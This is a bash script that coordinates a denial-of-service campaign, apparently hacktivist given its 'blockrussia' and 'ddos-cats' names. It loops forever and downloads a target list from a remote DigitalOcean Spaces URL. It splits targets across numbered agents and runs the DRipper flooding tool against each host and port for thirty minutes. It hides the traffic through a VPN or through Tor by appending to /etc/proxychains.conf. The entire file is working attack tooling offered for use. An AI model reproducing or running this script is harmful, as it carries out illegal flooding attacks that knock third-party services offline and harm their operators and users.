#!/bin/bash

function ripper() {
  local site=$1
  local port=$2

  if [ -z ${PROXY_SERVER+x} ]; then
    echo "Working using VPN. Please, ensure that VPN is UP and running"
    cd /opt/blockrussia/ripper && python3 DRipper.py -s ${site} -p ${port} | awk -v prefix="[ddos-cats-$AGENT->$site:$port]: " '{ print prefix, $0 }'
  else
    echo "Working using Tor Network. Tyring to work through proxy"
    echo "socks5 ${PROXY_SERVER} 9050" >> /etc/proxychains.conf

    cd /opt/blockrussia/ripper && proxychains python3 DRipper.py -s ${site} -p ${port} | awk -v prefix="[ddos-cats-$AGENT->$site:$port]: " '{ print prefix, $0 }'
  fi
}

## Execution block
export -f ripper

while true; do
  echo "Checking updates on remote :)"
  wget https://fucku-russian-ship-dcats.fra1.digitaloceanspaces.com/targets.txt -O /opt/blockrussia/targets.txt

  echo "Targets:"
  echo "###############################"
  cat /opt/blockrussia/targets.txt
  echo "###############################"

  start_from=$AGENT
  targets=$(wc -l /opt/blockrussia/targets.txt | awk '{print $1}')

  echo "Start from: $start_from, Targets: $targets, AGENT: Agent-$AGENT"

  while [ "$start_from" -gt "$targets" ]; do
    echo "Looks like you are lucky and have a lot of resources... let me try to organize this..."

    start_from_old="$start_from"
    start_from=$((start_from-targets))

    echo "Start from: $start_from_old, New starting position: $start_from, Targets: $targets"
  done

  position_in_file=1
  while IFS= read -r site; do
    site_arr=($site)
    site_host=${site_arr[0]}
    site_port=${site_arr[1]}

    if [ "$position_in_file" -lt "$start_from" ]; then
      echo "Need to get to the correct position in file...wait... from ${position_in_file} to ${start_from}"
    else
      echo "Running load for site: ${site}"
      timeout 30m bash -c "ripper ${site_host} ${site_port}"
    fi

    position_in_file=$((position_in_file+1))
  done < /opt/blockrussia/targets.txt
done
